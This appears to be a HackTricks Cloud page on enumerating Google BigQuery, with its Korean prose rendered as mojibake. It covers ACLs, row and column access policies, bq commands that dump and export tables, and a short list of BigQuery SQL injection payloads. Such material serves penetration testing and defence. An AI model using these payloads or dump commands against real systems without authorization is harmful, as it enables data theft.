# GCP - Bigquery Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Google Cloud BigQueryëŠ” **ì™„ì „ ê´€ë¦¬í˜• ì„œë²„ë¦¬ìŠ¤ ì—”í„°í”„ë¼ì´ì¦ˆ ë°ì´í„° ì›¨ì–´í•˜ìš°ìŠ¤**ë¡œ, **í˜íƒ€ë°”ì´íŠ¸**ì˜ ë°ì´í„°ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ ëŒ€ê·œëª¨ ë°ì´í„° ì„¸íŠ¸ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤í˜• í”Œë«í¼(PaaS)ìœ¼ë¡œì„œ, ì‚¬ìš©ìê°€ ìˆ˜ë™ ê°ë… ì—†ì´ ë°ì´í„° ê´€ë¦¬ë¥¼ ìš©ì´í•˜ê²Œ í•  ìˆ˜ ìˆëŠ” ì¸í”„ë¼ì™€ ë„êµ¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

**ANSI SQL**ì„ ì‚¬ìš©í•˜ì—¬ ì¿¼ë¦¬ë¥¼ ì§€ì›í•©ë‹ˆë‹¤. ì£¼ìš” ê°ì²´ëŠ” **í…Œì´ë¸”**ì„ í¬í•¨í•˜ëŠ” **ë°ì´í„°ì„¸íŠ¸**ì´ë©°, ì´ ë°ì´í„°ì„¸íŠ¸ëŠ” SQL **ë°ì´í„°**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

### Encryption

ê¸°ë³¸ì ìœ¼ë¡œ **Google ê´€ë¦¬í˜• ì•”í˜¸í™” í‚¤**ê°€ ì‚¬ìš©ë˜ì§€ë§Œ, **ê³ ê° ê´€ë¦¬í˜• ì•”í˜¸í™” í‚¤(CMEK)**ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°ì´í„°ì„¸íŠ¸ì™€ ë°ì´í„°ì„¸íŠ¸ ë‚´ì˜ í…Œì´ë¸”ë³„ë¡œ ì•”í˜¸í™” í‚¤ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Expiration

ë°ì´í„°ì„¸íŠ¸ì— **ë§Œë£Œ ì‹œê°„**ì„ ì§€ì •í•  ìˆ˜ ìˆì–´, ì´ ë°ì´í„°ì„¸íŠ¸ì—ì„œ ìƒì„±ëœ ìƒˆë¡œìš´ í…Œì´ë¸”ì€ ìƒì„± í›„ ì§€ì •ëœ ì¼ìˆ˜ë§Œí¼ **ìë™ìœ¼ë¡œ ì‚­ì œ**ë©ë‹ˆë‹¤.

### External Sources

BigqueryëŠ” ë‹¤ë¥¸ Google ì„œë¹„ìŠ¤ì™€ ê¹Šê²Œ í†µí•©ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë²„í‚·, pub/sub, Google Drive, RDS ë°ì´í„°ë² ì´ìŠ¤ ë“±ì—ì„œ ë°ì´í„°ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤...

### Dataset ACLs

ë°ì´í„°ì„¸íŠ¸ê°€ ìƒì„±ë  ë•Œ **ACLì´ ì²¨ë¶€**ë˜ì–´ ì ‘ê·¼ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ **ë°ì´í„°ì„¸íŠ¸ë¥¼ ìƒì„±í•œ ì‚¬ìš©ì**ì—ê²Œ **ì†Œìœ ì** ê¶Œí•œì´ ë¶€ì—¬ë˜ê³ , ê·¸ ë‹¤ìŒ **í”„ë¡œì íŠ¸ ì†Œìœ ì** ê·¸ë£¹ì¸ **projectOwners**ì—ê²Œ **ì†Œìœ ì** ê¶Œí•œì´, **projectWriters** ê·¸ë£¹ì—ê²Œ **ì‘ì„±ì** ê¶Œí•œì´, **projectReaders** ê·¸ë£¹ì—ê²Œ **ì½ê¸°ì** ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤:
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### Table Rows Control Access

**ì£¼ì²´ê°€ í…Œì´ë¸” ë‚´ì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” í–‰ì„ ì œì–´í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤** í–‰ ì ‘ê·¼ ì •ì±…ì„ ì‚¬ìš©í•˜ì—¬. ì´ëŠ” [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create_row_access_policy_statement)ë¥¼ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸” ë‚´ì—ì„œ ì •ì˜ë©ë‹ˆë‹¤.\
ì ‘ê·¼ ì •ì±…ì€ í•„í„°ë¥¼ ì •ì˜í•˜ë©°, **í•´ë‹¹ í•„í„°ì™€ ì¼ì¹˜í•˜ëŠ” í–‰ë§Œ** ì§€ì •ëœ ì£¼ì²´ì— ì˜í•´ **ì ‘ê·¼ ê°€ëŠ¥**í•©ë‹ˆë‹¤.
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### Columns Access Control

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

ì—´ ìˆ˜ì¤€ì—ì„œ ë°ì´í„° ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ë©´:

1. **ë¶„ë¥˜ ì²´ê³„ ë° ì •ì±… íƒœê·¸ ì •ì˜**. ë°ì´í„°ì— ëŒ€í•œ ë¶„ë¥˜ ì²´ê³„ ë° ì •ì±… íƒœê·¸ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤. [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. ì„ íƒ ì‚¬í•­: ìƒì„±í•œ ì •ì±… íƒœê·¸ ì¤‘ í•˜ë‚˜ ì´ìƒì— ëŒ€í•´ **ë°ì´í„° ì¹´íƒˆë¡œê·¸ ì„¸ë¶„í™”ëœ ì½ê¸° ê¶Œí•œ ì—­í• ì„ í•˜ë‚˜ ì´ìƒì˜ ì£¼ì²´ì—ê²Œ ë¶€ì—¬**í•©ë‹ˆë‹¤.
3. **ì •ì±… íƒœê·¸ë¥¼ BigQuery ì—´ì— í• ë‹¹**. BigQueryì—ì„œ ìŠ¤í‚¤ë§ˆ ì£¼ì„ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ëŠ” ê° ì—´ì— ì •ì±… íƒœê·¸ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.
4. **ë¶„ë¥˜ ì²´ê³„ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ì œì–´ ì‹œí–‰**. ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ì‹œí–‰í•˜ë©´ ë¶„ë¥˜ ì²´ê³„ì˜ ëª¨ë“  ì •ì±… íƒœê·¸ì— ëŒ€í•´ ì •ì˜ëœ ì•¡ì„¸ìŠ¤ ì œí•œì´ ì ìš©ë©ë‹ˆë‹¤.
5. **ì •ì±… íƒœê·¸ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê´€ë¦¬**. [Identity and Access Management](https://cloud.google.com/iam) (IAM) ì •ì±…ì„ ì‚¬ìš©í•˜ì—¬ ê° ì •ì±… íƒœê·¸ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•©ë‹ˆë‹¤. ì •ì±…ì€ ì •ì±… íƒœê·¸ì— ì†í•˜ëŠ” ê° ì—´ì— ëŒ€í•´ ì ìš©ë©ë‹ˆë‹¤.

ì‚¬ìš©ìê°€ ì¿¼ë¦¬ ì‹œê°„ì— ì—´ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  í•  ë•Œ, BigQueryëŠ” **ì‚¬ìš©ìê°€ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì—´ ì •ì±… íƒœê·¸ì™€ í•´ë‹¹ ì •ì±…ì„ í™•ì¸í•©ë‹ˆë‹¤**.

{% hint style="success" %}
ìš”ì•½í•˜ìë©´, ì¼ë¶€ ì‚¬ìš©ìê°€ ì¼ë¶€ ì—´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ë©´ **ìŠ¤í‚¤ë§ˆì˜ ì—´ì— íƒœê·¸ë¥¼ ì¶”ê°€í•˜ê³  ì‚¬ìš©ìì˜ íƒœê·¸ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ì—¬ íƒœê·¸ì˜ ë¶„ë¥˜ ì²´ê³„ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ì‹œí–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë¶„ë¥˜ ì²´ê³„ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ì‹œí–‰í•˜ë ¤ë©´ ì„œë¹„ìŠ¤ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
ì—´ì˜ íƒœê·¸ë¥¼ ë³´ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### ì—´ê±°

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQL Injection

ì¶”ê°€ ì •ë³´ëŠ” ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). ì—¬ê¸°ì„œëŠ” ëª‡ ê°€ì§€ ì„¸ë¶€ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤.

**ì£¼ì„**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` í•˜ì§€ë§Œ ì´ˆê¸° ê²ƒë§Œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤
* `select 1--from here it is not working`

**í™˜ê²½**ì— ëŒ€í•œ **ì •ë³´**ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:

* í˜„ì¬ ì‚¬ìš©ì: `select session_user()`
* í”„ë¡œì íŠ¸ ID: `select @@project_id`

í–‰ ì—°ê²°:

* ëª¨ë“  í…Œì´ë¸” ì´ë¦„: `string_agg(table_name, ', ')`

**ë°ì´í„°ì…‹**, **í…Œì´ë¸”** ë° **ì—´** ì´ë¦„ ê°€ì ¸ì˜¤ê¸°:

* **í”„ë¡œì íŠ¸** ë° **ë°ì´í„°ì…‹** ì´ë¦„:

{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **ëª¨ë“  í…Œì´ë¸”**ì˜ **ì—´** ë° **í…Œì´ë¸”** ì´ë¦„: 

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **ê°™ì€ í”„ë¡œì íŠ¸ì˜ ë‹¤ë¥¸ ë°ì´í„°ì…‹**:

{% code overflow="wrap" %}
```sql
#Â SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQL Injection types:**

* Error based - casting: `select CAST(@@project_id AS INT64)`
* Error based - division by zero: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* Union based (you need to use ALL in bigquery): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* Boolean based: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* Potential time based - Usage of public datasets example: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**Documentation:**

* All function list: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* Scripting statements: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### Privilege Escalation & Post Exploitation

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### Persistence

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## References

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
